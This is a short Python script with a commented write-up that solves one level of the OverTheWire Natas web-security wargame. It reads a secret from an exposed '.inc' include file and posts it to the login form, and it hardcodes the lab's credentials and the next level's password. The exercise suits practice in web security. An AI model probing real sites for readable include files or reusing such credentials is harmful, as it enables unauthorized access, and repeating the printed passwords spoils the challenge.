#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path='/index.php'


#Custom Headers
custom_headers={'Origin':'http://natas6.natas.labs.overthewire.org','Authorization': 'Basic bmF0YXM2OmFHb1k0cTJEYzZNZ0RxNG9MNFl0b0t0eUFnOVBlSGEx'}
payload={"secret":"FOEIUWGHFEEUHOFUOIU","submit":"submit"}

#Payload
payload=''
url=host+path

session=requests.Session()
response=requests.post(url,auth=(basic_username,basic_password),data=payload,headers=custom_headers)
content=response.text
status=response.status_code
headers=response.headers



print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
cleanheaders(headers)


flag=content
print(flag)


#WRITEUP
#This time we find a login form in the main page and its source code

# <?

# include "includes/secret.inc";

#     if(array_key_exists("submit", $_POST)) {
#         if($secret == $_POST['secret']) {
#         print "Access granted. The password for natas7 is <censored>";
#     } else {
#         print "Wrong secret";
#     }
#     }
# ?>

#From the snippet above,we see that it gets its flag from the includes.secret.inc
#Since the .inc files are not like php files,this means we can see its contents just by visiting the page
# Vising the page we find that the secret is FOEIUWGHFEEUHOFUOIU
#Now we just need to submit it in our form using a post request and get the flag
#The flag is natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9